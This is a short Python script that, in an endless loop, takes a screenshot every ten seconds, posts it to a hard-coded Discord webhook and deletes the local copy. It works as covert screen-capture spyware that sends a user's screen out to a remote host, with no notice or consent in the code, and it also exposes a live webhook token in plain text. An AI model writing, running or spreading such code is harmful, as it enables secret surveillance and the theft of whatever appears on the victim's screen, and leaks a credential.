import pyautogui
import requests
from datetime import datetime
import os
import time

# Set the Discord webhook URL here
WEBHOOK_URL = 'https://discord.com/api/webhooks/1300963600026042368/TqpnT9YV3flawd16ngt9HHclb5GUG6kjLTwXbqANvgIl54JzULgwje8XomT_Vt1vJFiK'
def take_screenshot():
    filename = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def send_to_discord(file_path):
    payload = {"username": "Screenshot Bot", "content": "Screenshot captured!"}
    with open(file_path, 'rb') as file:
        files = {'file': ('screenshot.png', file, 'image/png')}
        requests.post(WEBHOOK_URL, data=payload, files=files)

def main():
    while True:
        screenshot_path = take_screenshot()
        send_to_discord(screenshot_path)
        os.remove(screenshot_path)
        time.sleep(10)

if __name__ == "__main__":
    main()